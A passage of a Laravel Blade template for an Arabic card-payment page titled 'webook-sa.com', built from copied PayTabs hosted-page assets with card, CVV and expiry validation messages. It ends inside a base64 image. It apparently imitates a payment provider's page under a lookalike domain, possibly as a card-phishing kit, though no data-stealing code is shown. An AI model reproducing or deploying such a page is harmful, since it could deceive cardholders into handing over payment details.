<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

    <script>
        ! function(w) {
            let dictionary = {}
            dictionary.tokens = {
                'hpp_accept_tnc': 'الرجاء القبول بالشروط والأحكام',
                'hpp_button_wait': 'جاري إتمام العملية ، يرجى الانتظار',
                'hpp_cardcvv_invalid': 'رمز أمان البطاقة غير صحيح',
                'hpp_cardexpiry_invalid': 'انتهاء صلاحية البطاقة غير صحيح',
                'hpp_cardnum_invalid': 'رقم البطاقة غير صحيح',
                'hpp_cardtype_invalid': 'نوع البطاقة غير مدعوم',
                'hpp_enter_valid_address_too_long': 'العنوان طويل جدًا',
                'hpp_enter_valid_amount': 'الرجاء إدخال المبلغ',
                'hpp_enter_valid_amount_max': 'يجب ألا يكون المبلغ أكبر من:',
                'hpp_enter_valid_amount_min': 'يجب أن يكون المبلغ على الأقل:',
                'hpp_enter_valid_city': 'الرجاء إدخال المدينة',
                'hpp_enter_valid_country': 'الرجاء إدخال الدولة',
                'hpp_enter_valid_email': 'يرجى إدخال البريد الإلكتروني الصحيح',
                'hpp_enter_valid_full_address': 'الرجاء إدخال العنوان الكامل',
                'hpp_enter_valid_mobile': 'الرجاء إدخال رقم جوال صحيح.',
                'hpp_enter_valid_national_id': 'الرجاء إدخال رقم هوية \/ قومي صحيح.',
                'hpp_enter_valid_name': 'من فضلك ادخل اسمك الكامل',
                'hpp_enter_valid_state': 'الرجاء إدخال الولاية \/المنطقة',
                'hpp_enter_valid_zip': 'الرجاء إدخال الرمز البريدي بتنسيق',
                'hpp_enter_valid_id': 'يرجى إدخال معرّف التاجر الخاص بك',
                'hpp_or': 'او',
                'hpp_shipping_sync_confirm_override': 'سيتم مسح معلومات الشحن المدخلة؟',
            }

            dictionary.set = function(tag, value) {
                if (tag !== "") {
                    dictionary.tokens[tag] = value
                }
            }

            dictionary.isSet = function(tag) {
                if (tag !== "") {
                    if (dictionary.tokens.hasOwnProperty(tag)) {
                        return true
                    }
                }
                return false
            }

            dictionary.get = function(tag) {
                if (tag !== "") {
                    if (dictionary.tokens.hasOwnProperty(tag)) {
                        return dictionary.tokens[tag]
                    }
                    return "[unknown_dtag:" + tag + "]";
                }
                return ""
            }

            dictionary.getIfSet = function(tag) {
                if (tag !== "") {
                    if (dictionary.tokens.hasOwnProperty(tag)) {
                        return dictionary.tokens[tag]
                    }
                }
                return ""
            }

            w.dictionary = dictionary;
        }(window)
    </script>


    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="google" content="nopagereadaloud">
    <link rel="shortcut icon" href="{{asset('assets/theme/paytabs/favicon/favicon.ico')}}" />

    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>webook-sa.com | دفع</title>


    <link rel="stylesheet" href="{{asset('assets/hpp/css/paytabs-paypage-rtl.min.css')}}" type="text/css" />

    <script src=" https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js "></script>


{{--    <link rel="script" defer="defer" href="{{asset('assets/hpp/js/paylib.js')}}">--}}
{{--    <link rel="script" defer="defer" href="{{asset('assets/hpp/js/hpp.js')}}">--}}

    <script src="{{asset('assets/hpp/js/paylib.js')}}" type="text/javascript"></script>
    <script src="{{asset('assets/hpp/js/hpp.js')}}" type="text/javascript"></script>

</head>

<body>

@if (session('order'))

    @php
        $grandTotal = 0;
        $order = session('order');
    @endphp

    @foreach ($order->tickets as $ticket)
        @php
            $price = $ticket->price;
            $count = $ticket->pivot->count;
            $total = $price * $count;
            $grandTotal += $total;
        @endphp
    @endforeach
@endif

<div id="loader" class="d-none" style="z-index:100000000;height:100%;width:100%;background: #DDD; opacity:0.7; position: fixed;">
    <div class="d-flex justify-content-center" style="position: relative; height: 100%">
        <div class="spinner-border text-primary" style="position: absolute; top: calc(50% - 7rem); width: 7rem; height: 7rem; border-width: 1.5em" role="status">
            <span class="sr-only">جار التحميل...</span>
        </div>
    </div>
</div>

<style type="text/css">
    body {
        background: #090909;
    }

    header {
        background: #090909;
        background-image: url(data:image/png;base64,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